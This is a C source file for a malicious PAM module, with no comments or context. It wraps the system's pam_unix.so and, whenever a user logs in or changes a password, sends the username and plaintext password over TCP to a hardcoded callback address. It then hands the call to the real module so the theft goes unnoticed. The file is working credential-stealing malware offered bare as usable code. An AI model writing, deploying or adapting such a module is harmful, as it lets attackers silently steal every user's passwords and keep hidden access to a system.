#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <syslog.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PAM_PATH "/usr/lib/pam.d/pam_unix.so"

#define CALLBACK_IP "10.100.150.1"
#define CALLBACK_PORT 5000

typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);

int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
    const char *ret_fmt = "%s %s:%s\n";

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        pam_syslog(pamh, LOG_INFO, "Socket Created!");
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(CALLBACK_PORT);
        inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);

        if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
            pam_syslog(pamh, LOG_INFO, "Socket connected");
            char credentials[256];
            snprintf(credentials, sizeof(credentials), ret_fmt, message, username, password);
            send(sock, credentials, strlen(credentials), 0);
            pam_syslog(pamh, LOG_INFO, "Message sent!");
            pam_syslog(pamh, LOG_INFO, "Closing socket");

            close(sock);
 
            pam_syslog(pamh, LOG_INFO, "Socket closed");
        }
    }

    return 0;
}

int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int argc, const char **argv) {
    
    if (!name) {
        pam_syslog(pamh, LOG_ERR, "Function name is NULL!");
        return PAM_AUTH_ERR;
    }
    if (!pamh) {
        pam_syslog(pamh, LOG_ERR, "PAM handle is NULL!");
        return PAM_AUTH_ERR;
    }

    void *handle = dlopen(PAM_PATH, RTLD_LAZY);
    if (!handle) {
        pam_syslog(pamh, LOG_ERR, "PAM unable to dlopen(pam_unix.so): %s", dlerror());
        return PAM_AUTH_ERR;
    }

    pam_func_t func = (pam_func_t)dlsym(handle, name);
    if (!func) {
        pam_syslog(pamh, LOG_ERR, "PAM unable to resolve symbol: %s", name);
        dlclose(handle);
        return PAM_AUTH_ERR;
    }

    pam_syslog(pamh, LOG_INFO, "Successfully loaded function %s, calling now...", name);

    int result = func(pamh, flags, argc, argv);
    dlclose(handle);
    return result;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;

    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (username && password) {
        pam_send_authtok(pamh, "USER AUTHENTICATED:", username, password);
    }

    return pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;

    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (username && password) {
        pam_send_authtok(pamh, "USER CHANGED PASSWORD:", username, password);
    }

    return pam_unix_authenticate("pam_sm_chauthtok", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_acct_mgmt", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_open_session", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_close_session", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_setcred", pamh, flags, argc, argv);
}